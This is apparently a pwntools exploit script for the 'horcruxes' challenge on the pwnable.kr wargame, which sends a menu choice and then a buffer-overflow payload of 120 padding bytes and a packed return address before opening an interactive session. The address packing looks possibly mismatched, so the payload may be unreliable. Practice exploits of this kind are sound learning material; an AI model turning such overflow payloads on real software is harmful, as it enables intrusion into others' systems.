#!/usr/bin/env python3
from pwn import * 

context.binary = elf = ELF('./horcruxes')
context.log_level = 'DEBUG'

if args['REMOTE']:
    io = remote('pwnable.kr', 9032)
else: 
    io = process([elf.path])

io.sendline('10'.encode())
io.recvuntil('How many EXP did you earned? : ')

payload = flat(
    b'a' *  120,
    p64(0x80a010b)
)

io.sendline(payload)
io.interactive()